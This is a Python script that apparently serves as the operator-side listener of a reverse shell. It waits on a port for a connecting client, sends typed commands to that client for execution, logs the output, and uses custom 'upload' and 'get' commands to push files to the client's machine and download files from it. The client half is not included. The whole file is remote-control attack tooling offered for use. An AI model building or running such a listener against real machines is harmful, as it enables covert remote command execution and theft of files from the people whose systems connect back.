import socket
from sys import exit

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#change LHOST if ur aren't going to use this script for one machine purposes 
LHOST = "127.0.0.1"
LPORT = 5050

s.bind((LHOST, LPORT))
s.listen()

while True:
    print("[*] Server is Listening [*]")
    conn, addr = s.accept()
    print(f'onnection Established: {addr}')

    try:
        while True:
            cmnd = input("Command: ")
            logs = open('logs.txt','a')
            #file that logs commands and their output 
            logs.write(f'Command: {cmnd}')
            
            if cmnd == 'quit':
                break
            else:

                #custom command get and upload for file uploads and downloads
                if len(cmnd) > 0 and cmnd[:3] != 'get': 
                    if cmnd[:6] == 'upload':
                        #File upload to clients machine
                        conn.sendall(cmnd.encode())
                        status = conn.recv(1000).decode()

                        if "Ready" in status:
                            f = open(cmnd[7:], "rb")
                            conn.sendall(f.read())
                            f.close()
                            print("File Uploaded Sucessfully")
                            logs.write(f'File Uploaded: {cmnd[7:]}')

                        else :
                            print("Client File Upload Failed")
                    else:
                        conn.sendall(cmnd.encode())
                        packet = conn.recv(5000)
                        dcded = packet.decode()
                        print(dcded)
                        try:

                            logs.write('\n'+'-'*5+'\n')
                            logs.write(f'Output: \n {15*"-"} {dcded} \n {"-"*15}') 
                            logs.close()
                        except Exception as f:
                            print(f)
                #custom 'get' command to download files from client    
                elif len(cmnd) > 0 and cmnd[:3] == 'get':
                    try:
                        filename = input("Name a New File: ")
                
                        conn.sendall(cmnd.encode())
                        packet = conn.recv(5000)
                    #dcded = packet.decode()
            
                        f = open(filename, 'wb')
                        f.write(packet)
                        f.close
                    except Exception as f:
                        print(f)

    
                else:
                    print('Empty Command!')
    except KeyboardInterrupt:
        conn.sendall('quit'.encode())
        exit()

    except:
        print(f'Lost Connection with: {addr}')


